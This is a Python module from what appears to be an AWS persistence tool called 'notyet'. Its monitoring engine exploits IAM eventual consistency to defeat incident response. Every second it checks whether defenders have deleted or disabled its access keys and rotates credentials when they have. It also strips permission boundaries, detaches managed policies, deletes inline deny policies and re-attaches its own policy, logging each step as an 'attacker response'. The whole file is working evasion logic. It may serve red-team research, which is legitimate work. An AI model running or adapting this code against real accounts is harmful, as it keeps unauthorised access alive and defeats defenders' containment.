"""
Monitoring Engine for continuous health checks and policy monitoring.

This module implements the monitoring loops that detect and respond to
defender actions in real-time. It runs two parallel async tasks:
1. Health check loop (every 5 seconds) - detects access revocation via S3 ListBuckets
2. Policy monitor loop (every 1 second) - ensures notyet policy remains attached
"""

import asyncio
import logging
from typing import Optional

from .aws_clients import S3Client
from .event_logger import EventLogger
from .models import CallerIdentity
from .policy_manager import PolicyManager


logger = logging.getLogger(__name__)


class MonitoringEngine:
    """
    Manages parallel async monitoring tasks for health checks and policy monitoring.

    The monitoring engine runs two independent loops:
    - Health check loop: Calls S3 ListBuckets every 5 seconds to detect access revocation
    - Policy monitor loop: Checks and restores the notyet policy every 1 second

    Both loops run concurrently using asyncio and can be gracefully stopped.

    Attributes:
        policy_manager: PolicyManager instance for policy operations
        s3: S3Client instance for health checks
        logger: Logger instance for operation logging
        running: Flag indicating if monitoring is active
        _health_check_task: Async task for health check loop
        _policy_monitor_task: Async task for policy monitor loop
    """

    def __init__(
        self,
        policy_manager: PolicyManager,
        s3_client: S3Client,
        event_logger: Optional[EventLogger] = None,
        logger_instance: logging.Logger = None,
        on_credentials_invalid = None
    ):
        """
        Initialize MonitoringEngine.

        Args:
            policy_manager: PolicyManager instance for policy operations
            s3_client: S3Client instance for health checks
            event_logger: Optional EventLogger for structured event output
            logger_instance: Optional logger instance (defaults to module logger)
            on_credentials_invalid: Optional callback to trigger when credentials become invalid
        """
        self.policy_manager = policy_manager
        self.s3 = s3_client
        self.event_logger = event_logger
        self.logger = logger_instance or logger
        self.running = False
        self._health_check_task: Optional[asyncio.Task] = None
        self._policy_monitor_task: Optional[asyncio.Task] = None
        self.on_credentials_invalid = on_credentials_invalid
        self.identity: Optional[CallerIdentity] = None
        self._rotation_in_progress = False  # Flag to pause monitoring during rotation

    def _emit_defender_action(self, action: str, details: dict = None) -> None:
        """Emit a structured DEFENDER_ACTION event via event_logger."""
        if self.event_logger:
            self.event_logger.log_defender_action(action, details or {})

    def _emit_attacker_response(self, action: str, details: dict = None) -> None:
        """Emit a structured ATTACKER_RESPONSE event via event_logger."""
        if self.event_logger:
            self.event_logger.log_attacker_response(action, details or {})
    
    async def start(
        self,
        identity: CallerIdentity,
        exit_on_access_denied: bool = False
    ) -> None:
        """
        Start health check and policy monitoring loops.
        
        This method launches two parallel async tasks:
        1. Health check loop (every 5 seconds)
        2. Policy monitor loop (every 1 second)
        
        The loops run until stop() is called or (for health check) until
        access is revoked and exit_on_access_denied is True.
        
        Args:
            identity: CallerIdentity object with identity information
            exit_on_access_denied: If True, stop all loops when AccessDenied is detected
        
        Raises:
            RuntimeError: If monitoring is already running
        """
        if self.running:
            raise RuntimeError("Monitoring is already running")
        
        self.running = True
        self.identity = identity
        
        # Launch both monitoring loops as parallel tasks
        self._health_check_task = asyncio.create_task(
            self._health_check_loop(exit_on_access_denied)
        )
        self._policy_monitor_task = asyncio.create_task(
            self._policy_monitor_loop()
        )
        
        # Wait for both tasks to complete (or until stopped)
        try:
            await asyncio.gather(
                self._health_check_task,
                self._policy_monitor_task,
                return_exceptions=True
            )
        except Exception as e:
            self.logger.error(f"Error in monitoring loops: {str(e)}")
            raise
        finally:
            self.running = False
    
    async def stop(self) -> None:
        """
        Gracefully stop all monitoring loops.
        
        This method cancels both monitoring tasks and waits for them to complete.
        It ensures a clean shutdown without leaving dangling tasks.
        """
        if not self.running:
            return
        
        self.running = False
        
        # Cancel both tasks
        if self._health_check_task and not self._health_check_task.done():
            self._health_check_task.cancel()
            try:
                await self._health_check_task
            except asyncio.CancelledError:
                pass
        
        if self._policy_monitor_task and not self._policy_monitor_task.done():
            self._policy_monitor_task.cancel()
            try:
                await self._policy_monitor_task
            except asyncio.CancelledError:
                pass
    
    async def _health_check_loop(self, exit_on_access_denied: bool) -> None:
        """
        Health check loop that runs every 5 seconds.
        
        This loop calls S3 ListBuckets in us-east-1 to detect if access has been
        revoked. If AccessDenied is detected and exit_on_access_denied is True,
        the loop stops and triggers shutdown of all monitoring.
        
        Args:
            exit_on_access_denied: If True, stop monitoring when AccessDenied is detected
        """
        consecutive_failures = 0
        max_consecutive_failures = 3
        
        while self.running:
            try:
                # Perform S3 ListBuckets health check
                success, error_code = self.s3.list_buckets()
                
                if success:
                    consecutive_failures = 0  # Reset failure counter
                    if self.event_logger:
                        self.event_logger.log_event(
                            "HEALTH_CHECK",
                            "S3 ListBuckets health check passed",
                            {"status": "success"}
                        )
                else:
                    consecutive_failures += 1
                    self.logger.warning(
                        f"Health check failed: {error_code} "
                        f"(consecutive failures: {consecutive_failures}/{max_consecutive_failures})"
                    )
                    if self.event_logger:
                        self.event_logger.log_event(
                            "HEALTH_CHECK",
                            f"S3 ListBuckets health check failed: {error_code}",
                            {"status": "failed", "error_code": error_code, "consecutive_failures": consecutive_failures}
                        )
                    
                    # Check if access has been denied
                    if error_code == "AccessDenied":
                        self.logger.error(
                            "Access denied detected - credentials may be revoked. "
                            f"Consecutive failures: {consecutive_failures}"
                        )
                        
                        if exit_on_access_denied:
                            self.running = False
                            break
                        else:
                            self.logger.info("exit_on_access_denied is disabled, continuing monitoring")
                    
                    # If too many consecutive failures, log warning
                    if consecutive_failures >= max_consecutive_failures:
                        self.logger.error(
                            f"Health check has failed {consecutive_failures} times consecutively. "
                            f"There may be a persistent issue with credentials or AWS connectivity."
                        )
                
                # Wait 5 seconds before next check
                await asyncio.sleep(5)
            
            except asyncio.CancelledError:
                break
            except Exception as e:
                consecutive_failures += 1
                self.logger.error(
                    f"Unexpected error in health check loop: {str(e)} "
                    f"(consecutive failures: {consecutive_failures}/{max_consecutive_failures})"
                )
                # Continue running even if there's an error
                await asyncio.sleep(5)
    
    async def _policy_monitor_loop(self) -> None:
        """
        Policy monitor loop that runs every 1 second.
        
        This loop exploits AWS IAM eventual consistency by:
        1. Detecting when access keys are deleted/disabled (via ListAccessKeys)
        2. Detecting and removing permission boundaries
        3. Detecting and removing managed policies
        4. Detecting and removing other inline policies (keeping only notyet policy)
        5. Detecting when notyet inline policy is detached and restoring it
        6. Triggering credential rotation within the ~4 second consistency window
        
        The key insight: Even with deleted/disabled credentials, IAM read operations
        still work during the consistency window, allowing us to detect changes and respond.
        """
        consecutive_failures = 0
        max_consecutive_failures = 5
        
        # Store the current access key ID for monitoring
        current_access_key_id = self.policy_manager.iam.credentials.access_key_id
        
        while self.running:
            try:
                # Skip monitoring if rotation is in progress
                if self._rotation_in_progress:
                    await asyncio.sleep(1)
                    continue
                
                # Use the current identity (may be updated after rotation)
                identity = self.identity
                if not identity:
                    await asyncio.sleep(1)
                    continue
                
                # STEP 1: Check if our access keys have been deleted/disabled
                # This exploits eventual consistency - we can list keys even after they're deleted
                
                if identity.identity_type == "user":
                    try:
                        # List access keys for the user
                        response = self.policy_manager.iam._retry_with_backoff(
                            'list_access_keys',
                            UserName=identity.identity_name
                        )
                        access_keys = response.get('AccessKeyMetadata', [])
                        
                        # Check if our current access key is in the list and its status
                        our_key_found = False
                        our_key_active = False
                        
                        for key in access_keys:
                            if key['AccessKeyId'] == current_access_key_id:
                                our_key_found = True
                                our_key_active = (key['Status'] == 'Active')
                                break
                        
                        # If our key is not found or inactive, trigger rotation
                        if not our_key_found:
                            self._emit_defender_action(
                                f"Access key {current_access_key_id} has been DELETED",
                                {"key_id": current_access_key_id, "action": "deleted"}
                            )

                            if self.on_credentials_invalid:
                                self._rotation_in_progress = True
                                await self.on_credentials_invalid()
                                self._rotation_in_progress = False
                                # Update the access key ID after rotation
                                current_access_key_id = self.policy_manager.iam.credentials.access_key_id
                                self._emit_attacker_response(
                                    "Credential rotation completed",
                                    {"new_key_id": current_access_key_id}
                                )
                                consecutive_failures = 0
                                continue
                        elif not our_key_active:
                            self._emit_defender_action(
                                f"Access key {current_access_key_id} has been DISABLED",
                                {"key_id": current_access_key_id, "action": "disabled"}
                            )

                            if self.on_credentials_invalid:
                                self._rotation_in_progress = True
                                await self.on_credentials_invalid()
                                self._rotation_in_progress = False
                                # Update the access key ID after rotation
                                current_access_key_id = self.policy_manager.iam.credentials.access_key_id
                                self._emit_attacker_response(
                                    "Credential rotation completed",
                                    {"new_key_id": current_access_key_id}
                                )
                                consecutive_failures = 0
                                continue
                    
                    except Exception as key_check_error:
                        # If we get InvalidClientTokenId here, it means the consistency window has passed
                        if "InvalidClientTokenId" in str(key_check_error) or "InvalidAccessKeyId" in str(key_check_error):
                            self.logger.error(
                                f"Consistency window has passed - credentials are now fully invalid. "
                                f"Cannot trigger rotation. Error: {str(key_check_error)}"
                            )
                            consecutive_failures += 1
                        else:
                            self.logger.warning(f"Error checking access key status: {str(key_check_error)}")
                
                # STEP 2: Check for permission boundaries
                # Permission boundaries can block all IAM operations even with AdministratorAccess
                try:
                    has_boundary = False
                    if identity.identity_type == "user":
                        response = self.policy_manager.iam._retry_with_backoff('get_user', UserName=identity.identity_name)
                        has_boundary = 'PermissionsBoundary' in response.get('User', {})
                    elif identity.identity_type == "role":
                        response = self.policy_manager.iam._retry_with_backoff('get_role', RoleName=identity.identity_name)
                        has_boundary = 'PermissionsBoundary' in response.get('Role', {})
                    
                    if has_boundary:
                        boundary_arn = response.get('User' if identity.identity_type == "user" else 'Role', {}).get('PermissionsBoundary', {}).get('PermissionsBoundaryArn', 'Unknown')
                        self._emit_defender_action(
                            f"Permission boundary detected: {boundary_arn}",
                            {"boundary_arn": boundary_arn}
                        )
                        self.policy_manager._remove_permission_boundaries(identity)
                        self._emit_attacker_response(
                            "Permission boundary removed",
                            {"boundary_arn": boundary_arn}
                        )
                        consecutive_failures = 0
                        # Skip policy check this iteration - wait for boundary removal to propagate
                        await asyncio.sleep(1)
                        continue
                except Exception as boundary_error:
                    error_str = str(boundary_error)
                    # Check if this is an explicit deny or just lack of permissions
                    if "AccessDenied" in error_str:
                        if "no identity-based policy allows" in error_str or "no permissions" in error_str.lower():
                            # This is lack of permissions, not a boundary blocking us
                            # The notyet policy is missing, which will be handled in STEP 5
                            # Don't log this as an error - it's expected during policy propagation
                            pass
                        elif "permissions boundary" in error_str.lower():
                            # This is actually a permission boundary blocking us
                            self._emit_defender_action(
                                "Permission boundary is blocking IAM operations",
                                {"error": error_str}
                            )
                            consecutive_failures += 1
                        else:
                            # Some other AccessDenied error
                            self.logger.warning(f"AccessDenied when checking permission boundary: {error_str}")
                    elif "InvalidClientTokenId" in error_str or "InvalidAccessKeyId" in error_str:
                        # Eventual consistency - credentials not yet valid
                        pass
                    else:
                        self.logger.warning(f"Error checking permission boundary: {error_str}")
                
                # STEP 3: Check for and remove managed policies
                # Defender may attach managed policies with explicit denies
                try:
                    if identity.identity_type == "user":
                        response = self.policy_manager.iam._retry_with_backoff('list_attached_user_policies', UserName=identity.identity_name)
                        attached_policies = response.get('AttachedPolicies', [])
                    elif identity.identity_type == "role":
                        response = self.policy_manager.iam._retry_with_backoff('list_attached_role_policies', RoleName=identity.identity_name)
                        attached_policies = response.get('AttachedPolicies', [])
                    else:
                        attached_policies = []
                    
                    # Remove any managed policies (we only want inline notyet policy)
                    if attached_policies:
                        for policy in attached_policies:
                            policy_arn = policy['PolicyArn']
                            self._emit_defender_action(
                                f"Managed policy detected: {policy_arn}",
                                {"policy_arn": policy_arn}
                            )
                            try:
                                if identity.identity_type == "user":
                                    self.policy_manager.iam._retry_with_backoff('detach_user_policy', UserName=identity.identity_name, PolicyArn=policy_arn)
                                elif identity.identity_type == "role":
                                    self.policy_manager.iam._retry_with_backoff('detach_role_policy', RoleName=identity.identity_name, PolicyArn=policy_arn)
                                self._emit_attacker_response(
                                    f"Managed policy removed: {policy_arn}",
                                    {"policy_arn": policy_arn}
                                )
                            except Exception as detach_error:
                                self.logger.error(f"Failed to detach managed policy {policy_arn}: {str(detach_error)}")
                        consecutive_failures = 0
                except Exception as managed_policy_error:
                    error_str = str(managed_policy_error)
                    if "AccessDenied" in error_str:
                        if "no identity-based policy allows" in error_str or "no permissions" in error_str.lower():
                            # This is lack of permissions, not a managed policy blocking us
                            # The notyet policy is missing, which will be handled in STEP 5
                            pass
                        elif "explicit deny in an identity-based policy" in error_str or "explicit deny in a permissions boundary" in error_str:
                            # This is actually a policy blocking us
                            self._emit_defender_action(
                                "Managed policy is blocking IAM operations",
                                {"error": error_str}
                            )
                            consecutive_failures += 1
                        else:
                            # Some other AccessDenied error
                            self.logger.warning(f"AccessDenied when checking managed policies: {error_str}")
                    elif "InvalidClientTokenId" in error_str or "InvalidAccessKeyId" in error_str:
                        # Eventual consistency - credentials not yet valid
                        pass
                    else:
                        self.logger.warning(f"Error checking managed policies: {error_str}")
                
                # STEP 4: Check for and remove other inline policies (except notyet policy)
                # Defender may add inline policies with explicit denies
                try:
                    if identity.identity_type == "user":
                        response = self.policy_manager.iam._retry_with_backoff('list_user_policies', UserName=identity.identity_name)
                        inline_policies = response.get('PolicyNames', [])
                    elif identity.identity_type == "role":
                        response = self.policy_manager.iam._retry_with_backoff('list_role_policies', RoleName=identity.identity_name)
                        inline_policies = response.get('PolicyNames', [])
                    else:
                        inline_policies = []
                    
                    # Remove any inline policies that aren't the notyet policy
                    other_policies = [p for p in inline_policies if p != self.policy_manager.notyet_policy_name]
                    if other_policies:
                        for policy_name in other_policies:
                            self._emit_defender_action(
                                f"Inline policy detected: {policy_name}",
                                {"policy_name": policy_name}
                            )
                            try:
                                if identity.identity_type == "user":
                                    self.policy_manager.iam._retry_with_backoff('delete_user_policy', UserName=identity.identity_name, PolicyName=policy_name)
                                elif identity.identity_type == "role":
                                    self.policy_manager.iam._retry_with_backoff('delete_role_policy', RoleName=identity.identity_name, PolicyName=policy_name)
                                self._emit_attacker_response(
                                    f"Inline policy removed: {policy_name}",
                                    {"policy_name": policy_name}
                                )
                            except Exception as delete_error:
                                self.logger.error(f"Failed to delete inline policy {policy_name}: {str(delete_error)}")
                        consecutive_failures = 0
                        # Skip policy check this iteration - wait for inline policy removal to propagate
                        await asyncio.sleep(1)
                        continue
                except Exception as inline_policy_error:
                    error_str = str(inline_policy_error)
                    if "AccessDenied" in error_str:
                        if "no identity-based policy allows" in error_str or "no permissions" in error_str.lower():
                            # This is lack of permissions, not an inline policy blocking us
                            # The notyet policy is missing, which will be handled in STEP 5
                            pass
                        elif "explicit deny in an identity-based policy" in error_str or "explicit deny in a permissions boundary" in error_str:
                            # This is actually a policy blocking us
                            self._emit_defender_action(
                                "Inline policy is blocking IAM operations",
                                {"error": error_str}
                            )
                            consecutive_failures += 1
                        else:
                            # Some other AccessDenied error
                            self.logger.warning(f"AccessDenied when checking inline policies: {error_str}")
                    elif "InvalidClientTokenId" in error_str or "InvalidAccessKeyId" in error_str:
                        # Eventual consistency - credentials not yet valid
                        pass
                    else:
                        self.logger.warning(f"Error checking inline policies: {error_str}")
                
                # STEP 5: Check if notyet policy is still attached
                is_attached = self.policy_manager.verify_policy(identity)
                
                if not is_attached:
                    self._emit_defender_action(
                        "Notyet policy has been detached/deleted",
                        {"policy_name": self.policy_manager.notyet_policy_name}
                    )
                    try:
                        self.policy_manager.restore_policy(identity)
                        self._emit_attacker_response(
                            "Notyet policy restored",
                            {"policy_name": self.policy_manager.notyet_policy_name}
                        )
                        consecutive_failures = 0  # Reset failure counter
                    except Exception as restore_error:
                        consecutive_failures += 1
                        if self.event_logger:
                            self.event_logger.log_event(
                                "ERROR",
                                f"Failed to restore notyet policy (attempt {consecutive_failures}/{max_consecutive_failures})",
                                {"error": str(restore_error)}
                            )
                        else:
                            self.logger.error(f"Failed to restore notyet policy: {str(restore_error)}")
                else:
                    consecutive_failures = 0  # Reset failure counter
                
                # Wait 1 second before next check
                await asyncio.sleep(1)
            
            except asyncio.CancelledError:
                break
            except Exception as e:
                consecutive_failures += 1
                self.logger.error(
                    f"Unexpected error in policy monitor loop: {str(e)} "
                    f"(consecutive failures: {consecutive_failures}/{max_consecutive_failures})"
                )
                # Continue running even if there's an error
                await asyncio.sleep(1)
